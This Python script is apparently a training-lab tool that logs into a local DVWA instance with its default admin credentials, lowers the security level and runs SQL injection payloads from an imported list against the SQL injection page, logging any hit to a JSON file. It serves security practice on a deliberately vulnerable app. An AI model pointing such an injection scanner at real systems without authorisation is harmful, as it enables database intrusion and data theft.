import requests
from bs4 import BeautifulSoup
from payloads import SQL_PAYLOADS
import json

session = requests.Session()

def login_dvwa():
    login_url = "http://localhost/dvwa/login.php"

    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")

    user_token = soup.find("input", {"name": "user_token"})["value"]

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    session.post(login_url, data=login_data)
    print("Logged into DVWA successfully.\n")


def set_security_low():
    security_url = "http://localhost/dvwa/security.php"

    response = session.get(security_url)
    soup = BeautifulSoup(response.text, "html.parser")

    user_token = soup.find("input", {"name": "user_token"})["value"]

    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": user_token
    }

    session.post(security_url, data=security_data)
    print("DVWA Security level set to LOW.\n")


def test_sql_injection(url):
    print("Starting SQL Injection Scan...\n")

    for payload in SQL_PAYLOADS:
        params = {
            "id": payload,
            "Submit": "Submit"
        }

        response = session.get(url, params=params)

        if "surname" in response.text.lower() or "error in your sql syntax" in response.text.lower():
            print("Possible SQL Injection detected!")
            print("Vulnerable Payload:", payload)
            print("URL Tested:", response.url)

            # Save result to JSON
            result = {
                "vulnerability": "SQL Injection",
                "payload": payload,
                "url": response.url
            }

            with open("results.json", "w") as file:
                json.dump(result, file, indent=4)

            print("Results saved to results.json")
            return

    print("Scan Completed. No SQL Injection detected.")


login_dvwa()
set_security_low()

target = "http://localhost/dvwa/vulnerabilities/sqli/"
test_sql_injection(target)